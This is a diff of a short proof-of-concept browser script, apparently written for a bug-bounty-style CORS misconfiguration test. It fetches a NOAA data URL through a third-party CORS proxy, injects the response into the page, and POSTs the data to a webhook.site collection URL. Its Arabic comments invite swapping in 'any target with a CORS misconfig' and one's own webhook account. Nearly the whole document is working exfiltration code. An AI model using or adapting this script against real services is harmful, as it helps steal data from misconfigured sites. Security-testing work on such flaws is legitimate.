@@ -1,15 +1,18 @@
-console.log("🔍 PoC script started...");
+<script>
+const proxy = "https://nasa-cors-proxy-poc-vuc3.vercel.app/api/fetch";
+const target = "https://data.goes.noaa.gov/data/pub/satellite_data.json"; // أو أي هدف به CORS misconfig
+const webhook = "https://webhook.site/your-id"; // عدّله حسب حسابك
 
-fetch(`${proxy}?url=${encodeURIComponent(target)}`, {
-  credentials: "omit"
-})
+console.log("🔍 PoC script started...");
+fetch(`${proxy}?url=${encodeURIComponent(target)}`, { credentials: "omit" })
   .then(res => {
     console.log("✅ Received response:", res.status);
     return res.text();
   })
   .then(data => {
     console.log("📦 Data received:", data.slice(0, 200));
-    document.body.innerHTML += "<pre style='color:lime'>" + data.slice(0, 500) + "</pre>";
+    document.body.innerHTML += "<pre>" + data.slice(0, 500) + "</pre>";
+    
     fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -18,5 +21,6 @@ fetch(`${proxy}?url=${encodeURIComponent(target)}`, {
   })
   .catch(e => {
     console.error("❌ Fetch failed:", e);
-    document.body.innerHTML += `<pre style='color:red'>❌ Error: ${e}</pre>`;
+    document.body.innerHTML += `<p style="color:red;">❌ Error: ${e}</p>`;
   });
+</script>
